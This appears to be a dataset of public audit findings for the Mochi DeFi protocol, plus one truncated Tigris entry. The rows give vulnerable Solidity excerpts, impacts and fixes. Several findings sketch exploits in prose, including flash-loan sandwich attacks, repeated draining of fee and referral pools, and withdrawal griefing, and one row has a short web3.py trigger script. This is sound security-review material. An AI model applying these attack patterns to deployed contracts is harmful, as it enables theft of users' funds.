42.md,"`FeePoolV0.sol#distributeMochi()` will unexpectedly flush `treasuryShare`, causing the protocol fee cannot be properly accounted for and collected",high,"`distributeMochi()` will call `_buyMochi()` to convert `mochiShare` to Mochi token and call `_shareMochi()` to send Mochi to vMochi Vault and veCRV Holders. It wont touch the `treasuryShare`.

However, in the current implementation, `treasuryShare` will be reset to `0`. This is unexpected and will cause the protocol fee can not be properly accounted for and collected.

[`FeePoolV0.sol#L79` L95](https://github.com/code-423n4/2021-10-mochi/blob/8458209a52565875d8b2cefcb611c477cefb9253/projects/mochi-core/contracts/feePool/FeePoolV0.sol#L79-L95)

```solidity
function _shareMochi() internal {
    IMochi mochi = engine.mochi();
    uint256 mochiBalance = mochi.balanceOf(address(this));
    // send Mochi to vMochi Vault
    mochi.transfer(
        address(engine.vMochi()),
        (mochiBalance * vMochiRatio) / 1e18
    );
    // send Mochi to veCRV Holders
    mochi.transfer(
        crvVoterRewardPool,
        (mochiBalance * (1e18 - vMochiRatio)) / 1e18
    );
    // flush mochiShare
    mochiShare = 0;
    treasuryShare = 0;
}
```

##### Impact
Anyone can call `distributeMochi()` and reset `treasuryShare` to `0`, and then call `updateReserve()` to allocate part of the wrongfuly resetted `treasuryShare` to `mochiShare` and call `distributeMochi()`.

Repeat the steps above and the `treasuryShare` will be consumed to near zero, profits the vMochi Vault holders and veCRV Holders. The protocol suffers the loss of funds.

##### Recommendation
Change to:

```solidity
function _buyMochi() internal {
    IUSDM usdm = engine.usdm();
    address[] memory path = new address[](2);
    path[0] = address(usdm);
    path[1] = address(engine.mochi());
    usdm.approve(address(uniswapRouter), mochiShare);
    uniswapRouter.swapExactTokensForTokens(
        mochiShare,
        1,
        path,
        address(this),
        type(uint256).max
    );
    // flush mochiShare
    mochiShare = 0;
}

function _shareMochi() internal {
    IMochi mochi = engine.mochi();
    uint256 mochiBalance = mochi.balanceOf(address(this));
    // send Mochi to vMochi Vault
    mochi.transfer(
        address(engine.vMochi()),
        (mochiBalance * vMochiRatio) / 1e18
    );
    // send Mochi to veCRV Holders
    mochi.transfer(
        crvVoterRewardPool,
        (mochiBalance * (1e18 - vMochiRatio)) / 1e18
    );
}
```"
42.md,`ReferralFeePoolV0.sol#claimRewardAsMochi()` Array out of bound exception,high,"[`ReferralFeePoolV0.sol#L28` L42](https://github.com/code-423n4/2021-10-mochi/blob/8458209a52565875d8b2cefcb611c477cefb9253/projects/mochi-core/contracts/feePool/ReferralFeePoolV0.sol#L28-L42)

```solidity
function claimRewardAsMochi() external {
    IUSDM usdm = engine.usdm();
    address[] memory path = new address[](2);
    path[0] = address(usdm);
    path[1] = uniswapRouter.WETH();
    path[2] = address(engine.mochi());
    usdm.approve(address(uniswapRouter), reward[msg.sender]);
    // we are going to ingore the slippages here
    uniswapRouter.swapExactTokensForTokens(
        reward[msg.sender],
        1,
        path,
        address(this),
        type(uint256).max
    );
```

In `ReferralFeePoolV0.sol#claimRewardAsMochi()`, `path` is defined as an array of length 2 while it should be length 3.

As a result, at L33, an out-of-bound exception will be thrown and revert the transaction.

##### Impact
`claimRewardAsMochi()` will not work as expected so that all the referral fees cannot be claimed but stuck in the contract."
42.md,`registerAsset()` can `overwrite _assetClass` value,high,"#### Impact
Everyone can call the function `registerAsset()` of MochiProfileV0.sol
Assuming the liquidity for the asset is sufficient, `registerAsset()` will reset the \_assetClass of an already registered asset to `AssetClass.Sigma`.

When the \_assetClass is changed to `AssetClass.Sigma` then `liquidationFactor()`, `riskFactor()`, `maxCollateralFactor()`, `liquidationFee()` `keeperFee()` `maxFee()` will also return a different value.
Then the entire vault will behave differently.
The threshold for liquidation will also be different, possibly leading to a liquidation that isn't supposed to happen.

#### Recommended Mitigation Steps
Add the following in function `registerAsset()`:
```solidity
require(\_assetClass\[\_asset] ==0,""Already exists"");
```"
42.md,`debts` calculation is not accurate,high,"#### Impact
The value of the global variable `debts` in the contract `MochiVault.sol` is calculated in an inconsistent way.

In the function `borrow()` the variable `debts` is increased with a value excluding the fee.
However in `repay()` and `liquidate()` it is decreased with the same value as `details\[\_id].debt` is decreased, which is including the fee.

This would mean that `debts` will end up in a negative value when all debts are repay-ed. Luckily the function `repay()` prevents this from happening.

In the meantime the value of `debts` isn't accurate.
This value is used directly or indirectly in:
- `utilizationRatio()`,` stabilityFee()` `calculateFeeIndex()` of `MochiProfileV0.sol`
- `liveDebtIndex()`, `accrueDebt()`, `currentDebt()` of `MochiVault.sol`

This means the entire debt and claimable calculations are slightly off.

#### Proof of Concept
[`vault/MochiVault` sol](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/vault/MochiVault.sol)

```solidity
function borrow(..)
details\[\_id].debt = totalDebt; // includes the fee
debts += \_amount;     // excludes the fee

function repay(..)
debts -= \_amount;\
details\[\_id].debt -= \_amount;

function liquidate(..)
debts -= \_usdm;
details\[\_id].debt -= \_usdm;
```

see [issue page](https://github.com/code-423n4/2021-10-mochi-findings/issues/25) for referenced code.

#### Recommended Mitigation Steps
In function `borrow()`:
replace
`debts += \_amount;`
with
`debts += totalDebt`

[ryuheimat (Mochi) confirmed](https://github.com/code-423n4/2021-10-mochi-findings/issues/25)"
42.md,Referrer can drain `ReferralFeePoolV0`,high,"#### Impact
function `claimRewardAsMochi` in `ReferralFeePoolV0.sol` did not reduce user reward balance, allowing referrer to claim the same reward repeatedly and thus draining the fee pool.

#### Proof of Concept
Did not reduce user reward balance at L28-47 in [ReferralFeePoolV0.sol](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/feePool/ReferralFeePoolV0.sol)

#### Recommended Mitigation Steps
Add the following lines

> rewards -= reward\[msg.sender];
> reward\[msg.sender] = 0;"
42.md,Liquidation will never work with non-zero discounts,high,"#### Impact
Right now, there is only one discount profile in the github repo: the ""`NoDiscountProfile`"" which does not discount the debt at all. This specific discount profile works correctly, but I claim that any other discount profile will result in liquidation never working.

Suppose that we instead have a discount profile where `discount()` returns any value strictly larger than 0. Now, suppose someone wants to trigger a liquidation on a position. First, `triggerLiquidation` will be called (within `DutchAuctionLiquidator.sol`). The variable ""debt"" is initialized as equal to `vault.currentDebt(\_nftId)`. Notice that `currentDebt(\_ndfId)` (within `MochiVault.sol`) simply scales the current debt of the position using the `liveDebtIndex()` function, but there is no discounting being done within the function - this will be important.

Back within the `triggerLiquidation` function, the variable ""collateral"" is  simply calculated as the total collateral of the position. Then, the function calls `vault.liquidate(\_nftId, collateral, debt)`, and I claim that this will never work due to underflow.  Indeed, the liquidate function will first update the debt of the position (due to the `updateDebt(\_id)` modifier). The debt of the position is thus updated using lines 99-107 in `MochiVault.sol`. We can see that the `details\[\_id].debt` is updated in the exact same way as the calculations for `currentDebt(\_nftId)`, however, there is the extra subtraction of the `discountedDebt` on line 107.

Eventually we will reach line 293 in `MochiVault.sol`. However, since we discounted the debt in the calculation of `details\[\_id].debt`, but we did not discount the debt for the passed in parameter \_usdm (and thus is strictly larger in value), line 293 will always error due to an underflow. In summary, any discount profile that actually discounts the debt of the position will result in all liquidations erroring out due to this underflow. Since no positions will be liquidatable, this represents a major flaw in the contract as then no collateral can be liquidated so the entire functionality of the contract is compromised.

#### Proof of Concept
- [Liquidate function in `MochiVault.sol`](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/vault/MochiVault.sol#:~:text=function-,liquidate,-)
- [`triggerLiquidation` function in `DutchAuctionLiquidator.sol`](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/liquidator/DutchAuctionLiquidator.sol#:~:text=function-,triggerLiquidation,-address%20_asset%2C%20uint256)

Retracing the steps as I have described above, we can see that any call to `triggerLiquidation` will result in:

```solidity
details\[\_id].debt -= \_usdm;
```

throwing an error since \_usdm will be larger than `details\[\_id].debt`.

#### Recommended Mitigation Steps
An easy fix is to simply change:

`details\[\_id].debt -= \_usdm;`

to be:

`details\[\_id].debt = 0;`

as liquidating a position should probably just be equivalent to repaying all of the debt in the position.

Side Note: If there are no other discount profiles planned to be added other than ""`NoDiscountProfile`"", then I would recommend deleting all of the discount logic entirely, since `NoDiscountProfile` doesn't actually do anything."
42.md,Anyone can extend withdraw wait period by depositing zero collateral,high,"#### Impact
In `MochiVault.sol`, the deposit function allows anyone to deposit collateral into any position. A malicious user can call this function with amount = 0, which would reset the amount of time the owner has to wait before they can withdraw their collateral from their position. This is especially troublesome with longer delays, as a malicious user would only have to spend a little gas to lock out all other users from being able to withdraw from their positions, compromising the functionality of the contract altogether.

#### Proof of Concept

the `deposit` function [here](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/vault/MochiVault.sol#:~:text=function-,deposit,-uint256%20_id%2C%20uint256)

Notice that calling this function with amount = 0 is not disallowed. This overwrites `lastDeposit\[\_id]`, extending the wait period before a withdraw is allowed.

#### Recommended Mitigation Steps
I would recommend adding:

`require(amount > 0, ""zero"")`

at the start of the function, as depositing zero collateral does not seem to be a necessary use case to support.

It may also be worthwhile to consider only allowing the owner of a position to deposit collateral."
42.md,treasury is vulnerable to sandwich attack,high,"#### Impact
There's a permissionless function `veCRVlock` in `MochiTreasury`. Since everyone can trigger this function, the attacker can launch a sandwich attack with flashloan to steal the funds.
[MochiTreasuryV0.sol#L73-L94](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/treasury/MochiTreasuryV0.sol#L73-L94)

Attackers can possibly steal all the funds in the treasury. I consider this is a high-risk issue.

#### Proof of Concept
[MochiTreasuryV0.sol#L73-L94](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/treasury/MochiTreasuryV0.sol#L73-L94)

Here's an exploit pattern

1.  Flashloan and buy CRV the uniswap pool
2.  Trigger `veCRVlock()`
3.  The treasury buys CRV at a very high price.
4.  Sell CRV and pay back the loan.

#### Recommended Mitigation Steps
Recommend to add `onlyOwner` modifier."
42.md,Changing NFT contract in the `MochiEngine` would break the protocol,high,"#### Impact
`MochiEngine` allows the operator to change the NFT contract in [MochiEngine.sol#L91-L93](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/MochiEngine.sol#L91-L93)

All the vaults would point to a different NFT address. As a result, users would not be access their positions. The entire protocol would be broken.

IMHO, A function that would break the entire protocol shouldn't exist.

I consider this is a high-risk issue.

#### Proof of Concept
[MochiEngine.sol#L91-L93](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/MochiEngine.sol#L91-L93)

#### Recommended Mitigation Steps
Remove the function."
42.md,`treasuryShare` is Overwritten in `FeePoolV0._shareMochi()`,high,"#### Impact
The `FeePoolV0.sol` contract accrues fees upon the liquidation of undercollaterised positions. These fees are split between treasury and `vMochi` contracts. However, when `distributeMochi()` is called to distribute `mochi` tokens to `veCRV` holders, both `mochiShare` and `treasuryShare` is flushed from the contract when there are still `usdm` tokens in the contract.

#### Proof of Concept
Consider the following scenario:

*   The `FeePoolV0.sol` contract contains 100 `usdm` tokens at an exchange rate of 1:1 with `mochi` tokens.
*   `updateReserve()` is called to set the split of `usdm` tokens such that `treasuryShare` has claim on 20 `usdm` tokens and `mochiShare` has claim on the other 80 tokens.
*   A `veCRV` holder seeks to increase their earnings by calling `distributeMochi()` before `sendToTreasury()` has been called.
*   As a result, 80 `usdm` tokens are converted to `mochi` tokens and  locked in a curve rewards pool.
*   Consequently, `mochiShare` and `treasuryShare` is set to `0` (aka flushed).
*   The same user calls `updateReserve()` to split the leftover 20 `usdm` tokens between `treasuryShare` and `mochiShare`.
*   `mochiShare` is now set to 16 `usdm` tokens.
*   The above process is repeated to distribute `mochi` tokens to `veCRV` holders again and again.
*   The end result is that `veCRV` holders have been able to receive all tokens that were intended to be distributed to the treasury.


[`FeePoolV0.sol` L94](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/feePool/FeePoolV0.sol#L94)

#### Tools Used
- Manual code review
- Discussions with the Mochi team.

#### Recommended Mitigation Steps
Consider removing the line in `FeePoolV0.sol` (mentioned above), where `treasuryShare` is flushed."
42.md,feePool is vulnerable to sandwich attack.,high,"#### Impact
There's a permissionless function `distributeMochi` in [FeePoolV0.sol L55-L62](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/feePool/FeePoolV0.sol#L55-L62). Since everyone can trigger this function, an attacker can launch a sandwich attack with flashloan to steal the funds.

The devs have mentioned this concern in the comment. An attacker can steal the funds with a flash loan attack.

Attackers can steal all the funds in the pool. I consider this is a high-risk issue.

#### Proof of Concept
[FeePoolV0.sol#L55-L62](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/feePool/FeePoolV0.sol#L55-L62)

Please refer to [yDai Incident](https://peckshield.medium.com/the-ydai-incident-analysis-forced-investment-2b8ac6058eb5) to check the severity of a `harvest` function without slippage control.

Please refer to [Mushrooms-finance-theft](https://medium.com/immunefi/mushrooms-finance-theft-of-yield-bug-fix-postmortem-16bd6961388f) to check how likely this kind of attack might happen.

#### Recommended Mitigation Steps
If the dev wants to make this a permissionless control, the contract should calculate a min return based on TWAP and check the slippage.


### Comments:"
42.md,Tokens Can Be Stolen By Frontrunning `VestedRewardPool.vest()` and `VestedRewardPool.lock()`,high,"#### Impact
The `VestedRewardPool.sol` contract is a public facing contract aimed at vesting tokens for a minimum of 90 days before allowing the recipient to withdraw their `mochi`. The `vest()` function does not utilise `safeTransferFrom()` to ensure that vested tokens are correctly allocated to the recipient. As a result, it is possible to frontrun a call to `vest()` and effectively steal a recipient's vested tokens. The same issue applies to the `lock()` function.

#### Proof of Concept
- [`VestedRewardPool.sol#L36` L46](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/emission/VestedRewardPool.sol#L36-L46)
- [`VestedRewardPool.sol#L54` L64](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/emission/VestedRewardPool.sol#L54-L64)

#### Tools Used
Manual code review
Discussions with the Mochi team

#### Recommended Mitigation Steps
Ensure that users understand that this function should not be interacted directly as this could result in lost `mochi` tokens. Additionally, it might be worthwhile creating a single externally facing function which calls `safeTransferFrom()`, `vest()` and `lock()` in a single transaction."
42.md,liquidation factor < collateral factor for Sigma type,medium,"The `MochiProfileV0` defines liquidation and collateral factors for different asset types.
For the `AssetClass.Sigma` type, the liquidation factor is *less* than the collateral factor:

```solidity
function liquidationFactor(address _asset)
    public
    view
    override
    returns (float memory)
{
    AssetClass class = assetClass(_asset);
    if (class == AssetClass.Sigma) { // } else if (class == AssetClass.Sigma) {
        return float({numerator: 40, denominator: 100});
    }
}

function maxCollateralFactor(address _asset)
    public
    view
    override
    returns (float memory)
{
    AssetClass class = assetClass(_asset);
    if (class == AssetClass.Sigma) {
        return float({numerator: 45, denominator: 100});
    }
}
```

This means that one can take a loan of up to 45% of their collateral but then immediately gets liquidated as the liquidation factor is only 40%.
There should always be a buffer between these such that taking the max loan does not immediately lead to liquidations:

> A safety buffer is maintained between max CF and LF to protect users against liquidations due to normal volatility. [Docs](https://hackmd.io/@az-/mochi-whitepaper#Collateral-Factor-CF)

#### Recommended Mitigation Steps
The max collateral factor for the Sigma type should be higher than its liquidation factor."
42.md,`regerralFeePool` is vulnerable to MEV searcher,medium,"#### Impact
`claimRewardAsMochi` in the `ReferralFeePoolV0` ignores slippage. This is not a desirable design. There are a lot of MEV searchers in the current network. Swapping assets with no slippage control would get rekted. Please refer to <https://github.com/flashbots/pm>.

Given the current state of the Ethereum network, users would likely be sandwiched. I consider this is a high-risk issue.

#### Proof of Concept
[ReferralFeePoolV0.sol#L28-L48](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/feePool/ReferralFeePoolV0.sol#L28-L48)
Please refer to  [Mushrooms Finance Theft of Yield Bug Fix Postmortem | by Immunefi | Immunefi | Medium](https://medium.com/immunefi/mushrooms-finance-theft-of-yield-bug-fix-postmortem-16bd6961388f) to see a possible attack pattern.

#### Recommended Mitigation Steps
I recommend adding `minReceivedAmount` as a parameter.

```solidity
function claimRewardAsMochi(uint256 _minReceivedAmount) external {
    // original logic here
    require(engine.mochi().balanceOf(address(this)) > _minReceivedAmount, ""!min"");
    engine.mochi().transfer(
        msg.sender,
        engine.mochi().balanceOf(address(this))
    );
}
```

Also, the front-end should calculate the min amount with the current price.

[ryuheimat (Mochi) confirmed](https://github.com/code-423n4/2021-10-mochi-findings/issues/62)"
42.md,A malicious user can potentially escape liquidation by creating a dust amount position and trigger the liquidation by themself,medium,"In the current implementation, a liquidated position can be used for depositing and borrowing again.

However, if there is a liquidation auction ongoing, even if the position is now `liquidatable`, the call of `triggerLiquidation()` will still fail.

The liquidator must `settleLiquidation` first.

If the current auction is not profitable for the liquidator, say the value of the collateral can not even cover the gas cost, the liquidator may be tricked and not liquidate the new loan at all.

Considering if the liquidator bot is not as small to handle this situation (take the profit of the new liquidation and the gas cost loss of the current auction into consideration), a malicious user can create a dust amount position trigger the liquidation by themself.

Since the collateral of this position is so small that it can not even cover the gas cost, liquidators will most certainly ignore this auction.

The malicious user will then deposit borrow the actual loan.

When this loan becomes `liquidatable`, liquidators may:

1.  confuse the current dust auction with the `liquidatable` position;
2.  unable to proceed with such a complex liquidation.

As a result, the malicious user can potentially escape liquidation.

##### Recommendation
Consider making liquidated positions unable to be used (for depositing and borrowing) again."
42.md,Unchecked ERC20 transfer calls,medium,"ERC20 `transfer` and `transferFrom` calls normally return `true` on a succesful transfer. In DutchAuctionLiquidator the call `asset.transfer(msg.sender, _collateral);` is made. `asset` refers to whichever ERC20 asset is used for the vault of that auction. If `asset` is an ERC20 token which does not comply with the EIP-20 standard it might return `false` on a failed transaction rather than revert. In this case it would count as a valid transaction even though it is not. If a vault would be making use of USDT the transfer call would always revert as USDT returns `void` on transfers.

There are a few more transfer(From) calls which are unchecked, these are however all on a predetermined asset (mochi, usdM and crv) and unlikely to cause problems.

#### Proof of Concept
See [issue page](https://github.com/code-423n4/reports/blob/mochi/mochi/2021-10-mochi-findings-DRAFT.md) for referenced code.


#### Tools Used
Slither

#### Recommended Mitigation Steps
In other contracts the functions `cheapTransfer` and `cheapTransferFrom` are used which are part of the mochifi cheapERC20 library. These functions do check for a return value and could be used rather than `transfer` and `transferFrom`.

### Comments:"
42.md,Chainlink's `latestRoundData` might return stale or incorrect results,medium,"#### Proof of Concept
[`ChainlinkAdapter.sol` L49](https://github.com/code-423n4/2021-10-mochi/blob/8458209a52565875d8b2cefcb611c477cefb9253/projects/mochi-cssr/contracts/adapter/ChainlinkAdapter.sol#L49)

The `ChainlinkAdapter` calls out to a Chainlink oracle receiving the `latestRoundData()`. If there is a problem with Chainlink starting a new round and finding consensus on the new value for the oracle (e.g. Chainlink nodes abandon the oracle, chain congestion, vulnerability/attacks on the chainlink system) consumers of this contract may continue using outdated stale or incorrect data (if oracles are unable to submit no new round is started).

#### Recommended Mitigation Steps
Recommend adding the following checks:
```solidity
    ( roundId, rawPrice, , updateTime, answeredInRound ) = AggregatorV3Interface(XXXXX).latestRoundData();
    require(rawPrice > 0, ""Chainlink price <= 0"");
    require(updateTime != 0, ""Incomplete round"");
    require(answeredInRound >= roundId, ""Stale price"");
```
#### References
*   <https://consensys.net/diligence/audits/2021/09/fei-protocol-v2-phase-1/#chainlinkoraclewrapper-latestrounddata-might-return-stale-results>
*   <https://github.com/code-423n4/2021-05-fairside-findings/issues/70>"
42.md,Debt accrual is path-dependant and inaccurate,medium,"The total `debt` in `MochiVault.accrueDebt` increases by the current `debt` times the debt index growth.
This is correct but the total `debt` is then *reduced* again by the calling *user's* discounted debt, meaning, the total debt depends on which specific user performs the debt accrual.

This should not be the case.

#### POC
Assume we have a total debt of `2000`, two users A and B, where A has a debt of 1000, and B has a debt of 100.
The (previous) `debtIndex = 1.0` and accruing it now would increase it to `1.1`.

There's a difference if user A or B first does the accrual.

###### User A accrues first
User A calls `accrueDebt`: `increased = 2000 * 1.1/1.0 - 2000 = 200`. Thus `debts` is first set to `2200`. The user's `increasedDebt = 1000 * 1.1 / 1.0 - 1000 = 100` and assume a discount of `10%`, thus `discountedDebt = 100 * 10% = 10`.
Then `debts = 2200 - 10 = 2190`.

The next accrual will work with a total debt of `2190`.

###### User B accruess first
User B calls `accrueDebt`: `increased = 2000 * 1.1/1.0 - 2000 = 200`. Thus `debts` is first set to `2200`. The user's `increasedDebt = 100 * 1.1 / 1.0 - 100 = 10` and assume a discount of `10%`, thus `discountedDebt = 10 * 10% = 1`.
Then `debts = 2200 - 1 = 2199`.

The next accrual will work with a total debt of `2199`, leading to more debt overall.

#### Impact
The total debt of a system depends on who performs the accruals which should ideally not be the case.
The discrepancy compounds and can grow quite large if a whale always does the accrual compared to someone with almost no debt or no discount.

#### Recommended Mitigation Steps
Don't use the discounts or track the weighted average discount across all users that is subtracted from the increased total debt each time, i.e., reduce it by the discount of **all users** (instead of current caller only) when accruing to correctly track the debt."
42.md,Changing engine.nft contract breaks vaults,medium,"Governance can change the `engine.nft` address which is used by vaults to represent collateralized debt positions (CDP).
When minting a vault using `MochiVault.mint` the address returned ID will be used and overwrite the state of an existing debt position and set its status to `Idle`.

#### Impact
Changing the NFT address will allow overwriting existing CDPs.

#### Recommended Mitigation Steps
Disallow setting a new NFT address. or ensure that the new NFT's IDs start at the old NFT's IDs."
42.md,`UniswapV2/SushiwapLPAdapter` update the wrong token,medium,"The `UniswapV2LPAdapter/SushiswapV2LPAdapter.update` function retrieves the `underlying` from the LP token pair (`_asset`) but then calls `router.update(_asset, _proof)` which is the LP token itself again.
This will end up with the router calling this function again recursively.

#### Impact
This function fails as there's an infinite recursion and eventually runs out of gas.

#### Recommendation
The idea was most likely to update the `underlying` price which is used in `_getPrice` as `uint256 eAvg = cssr.getExchangeRatio(_underlying, weth);`.

Call `router.update(underlying, _proof)` instead. Note that the `_proof` does not necessarily update the `underlying <> WETH` pair, it could be any `underlying <> keyAsset` pair."
42.md,`UniswapV2TokenAdapter` does not support Sushiswap-only assets,medium,"The `UniswapV2TokenAdapter.supports` function calls its `aboveLiquidity` function which returns the UniswapV2 liquidity if the pair exists.
If this is below `minimumLiquidity`, the `supports` function will return `false`.

However, it could be that the `Sushiswap` pair has lots of liquidity and could be used.

```solidity
try uniswapCSSR.getLiquidity(_asset, _pairedWith) returns (
            uint256 liq
        ) {
    float memory price = cssrRouter.getPrice(_pairedWith);
    // @audit this returns early. if it's false it should check sushiswap first
    return convertToValue(liq, price) >= minimumLiquidity;
} catch {
    try sushiCSSR.getLiquidity(_asset, _pairedWith) returns (
        uint256 liq
    ) {
        float memory price = cssrRouter.getPrice(_pairedWith);
        return convertToValue(liq, price) >= minimumLiquidity;
    } catch {
        return false;
    }
}
```

#### Impact
Suppose the `UniswapV2TokenAdapter` wants to be used as an adapter for a Sushiswap pool.
An attacker creates a UniswapV2 pool for the same pair and does not provide liquidity.
The `Router.setPriceSource` calls `UniswapV2TokenAdapter.supports` and returns false as the Uniswap liquidity is too low, without checking the Sushiswap liquidity.

#### Recommendation
In `aboveLiquidity`, if the UniswapV2 liquidity is *less* than the minimum liquidity, instead of returning, compare the Sushiswap liquidity against this threshold."
42.md,griefing attack to block withdraws,medium,"#### Impact
Every time you deposit some assets in the vault (via `deposit()` of `MochiVault.sol`) then ""lastDeposit\[\_id]"" is set to `block.timestamp`.
The modifier `wait()` checks this value and makes sure you cannot withdraw for ""`delay()`"" blocks.
The default value for `delay()` is 3 minutes.

Knowing this delay you can do a griefing attack:
On chains with low gas fees: every 3 minutes deposit a tiny amount for a specific NFT-id (which has a large amount of assets).
On chains with high gas fees: monitor the mempool for a `withdraw()` transaction and frontrun it with a `deposit()`

This way the owner of the NFT-id can never withdraw the funds.

#### Proof of Concept
- [`MochiVault.sol#L47` L54](https://github.com/code-423n4/2021-10-mochi/blob/806ebf2a364c01ff54d546b07d1bdb0e928f42c6/projects/mochi-core/contracts/vault/MochiVault.sol#L47-L54)
- [`vault/MochiVault.sol` L171](https://github.com/code-423n4/2021-10-mochi/blob/806ebf2a364c01ff54d546b07d1bdb0e928f42c6/projects/mochi-core/contracts/vault/MochiVault.sol#L171)
- [`profile/MochiProfileV0.sol` L33](https://github.com/code-423n4/2021-10-mochi/blob/806ebf2a364c01ff54d546b07d1bdb0e928f42c6/projects/mochi-core/contracts/profile/MochiProfileV0.sol#L33)

#### Recommended Mitigation Steps
Create a mechanism where you only block the withdraw of recently deposited funds"
42.md,borrow function will borrow max cf when trying to borrow > cf,medium,"#### Impact
Borrow function in `MochiVault` will borrow to max cf when trying to borrow > cf instead of revert with "">cf"" as specified in the supplied test. The difference in behavior may cause user to borrow at dangerous collateral level, and receive less than the amount requested.

#### Proof of Concept
* [`MochiVault` sol](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/vault/MochiVault.sol)

#### Recommended Mitigation Steps
Revert if `details\[\_id].debt` + `\_amount` > `maxMinted` with "">cf"""
42.md,anyone can create a vault by directly calling the factory,medium,"#### Impact
In [MochiVaultFactory.sol#L26-L37](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/vault/MochiVaultFactory.sol#L26-L37), there's no permission control in the `vaultFactory`. Anyone can create a vault. The transaction would be reverted when the government tries to deploy such an asset.

As the protocol checks whether the vault is a valid vault by comparing the contract's address with the computed address, the protocol would recognize the random vault as a valid one.

I consider this is a medium-risk issue.

#### Proof of Concept
Here's a web3.py script to trigger the bug.

```py
vault_factory.functions.deployVault(usdt.address).transact()
## this tx would be reverted
profile.functions.registerAssetByGov([usdt.address], [3]).transact()
```

#### Recommended Mitigation Steps
Recommend to add a check.

```solidity
require(msg.sender == engine, ""!engine"");
```

[ryuheimat (Mochi) confirmed](https://github.com/code-423n4/2021-10-mochi-findings/issues/80)"
42.md,Improper Validation Of `create2` Return Value,medium,"#### Impact
The `BeaconProxyDeployer.deploy()` function is used to deploy lightweight proxy contracts that act as each asset's vault. The function does not revert properly if there is a failed contract deployment or revert from the `create2` opcode as it does not properly check the returned address for bytecode. The `create2` opcode returns the expected address which will never be the zero address (as is what is currently checked).

#### Proof of Concept
- [`BeaconProxyDeployer.sol` L31](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-library/contracts/BeaconProxyDeployer.sol#L31)

#### Tools Used
- Manual code review
- Discussions with the Mochi team
- Discussions with library dev

#### Recommended Mitigation Steps
The recommended mitigation was to update `iszero(result)` to `iszero(extcodesize(result))` in the line mentioned above. This change has already been made in the corresponding library which can be found [here](https://github.com/Nipol/bean-contracts/pull/13), however, this needs to also be reflected in Mochi's contracts."
42.md,`MochiTreasuryV0.withdrawLock()` Is Callable When Locking Has Been Toggled,medium,"#### Impact
`withdrawLock()` does not prevent users from calling this function when locking has been toggled. As a result, withdraws may be made unexpectedly.

#### Proof of Concept
- [`MochiTreasuryV0.sol#L40` L42](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/treasury/MochiTreasuryV0.sol#L40-L42)

#### Tools Used
Manual code review

#### Recommended Mitigation Steps
Consider adding `require(lockCrv, ""!lock"");` to `withdrawLock()` to ensure this function is not called unexpectedly. Alternatively if this is intended behaviour, it should be rather checked that the lock has not been toggled, otherwise users could maliciously relock tokens.

[ryuheimat (Mochi) confirmed](https://github.com/code-423n4/2021-10-mochi-findings/issues/161)"
42.md,`MochiTreasuryV0.sol` Is Unusable In Its Current State,medium,"#### Impact
`MochiTreasuryV0.sol` interacts with Curve's voting escrow contract to lock tokens for 90 days, where it can be later withdrawn by the governance role. However, `VotingEscrow.vy` does not allow contracts to call the following functions; `create_lock()`, `increase_amount()` and `increase_unlock_time()`. For these functions, `msg.sender` must be an EOA account or an approved smart wallet. As a result, any attempt to lock tokens will fail in `MochiTreasuryV0.sol`.

#### Proof of Concept
- [`VotingEscrow.vy` L418](https://github.com/curvefi/curve-dao-contracts/blob/master/contracts/VotingEscrow.vy#L418)
- [`VotingEscrow.vy` L438](https://github.com/curvefi/curve-dao-contracts/blob/master/contracts/VotingEscrow.vy#L438)
- [`VotingEscrow.vy` L455](https://github.com/curvefi/curve-dao-contracts/blob/master/contracts/VotingEscrow.vy#L455)


#### Tools Used
- Manual code review
- Discussions with the Mochi team

#### Recommended Mitigation Steps
Consider updating this contract to potentially use another escrow service that enables `msg.sender` to be a contract. Alternatively, this escrow functionality can be replaced with an internal contract which holds `usdm` tokens instead, removing the need to convert half of the tokens to Curve tokens. Holding Curve tokens for a minimum of 90 days may overly expose the Mochi treasury to Curve token price fluctuations."
192.md,Lock.sol: assets deposited with Lock.extendLock function are lost,high,"*Submitted by [HollaDieWaldfee](https://github.com/code-423n4/2022-12-tigris-findings/issues/23), also found by [sha256yan](https://github.com/code-423n4/2022-12-tigris-findings/issues/560), [kaliberpoziomka8552](https://github.com/code-423n4/2022-12-tigris-findings/issues/558), [0xsomeone](https://github.com/code-423n4/2022-12-tigris-findings/issues/447), [cccz](https://github.com/code-423n4/2022-12-tigris-findings/issues/330), [0xbepresent](https://github.com/code-423n4/2022-12-tigris-findings/issues/264), [ali\_shehab](https://github.com/code-423n4/2022-12-tigris-findings/issues/262), [Ruhum](https://github.com/code-423n4/2022-12-tigris-findings/issues/253), [rvierdiiev](https://github.com/code-423n4/2022-12-tigris-findings/issues/180), and [csanuragjain](https://github.com/code-423n4/2022-12-tigris-findings/issues/132)*

<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10> 

<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76> 

<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92> 

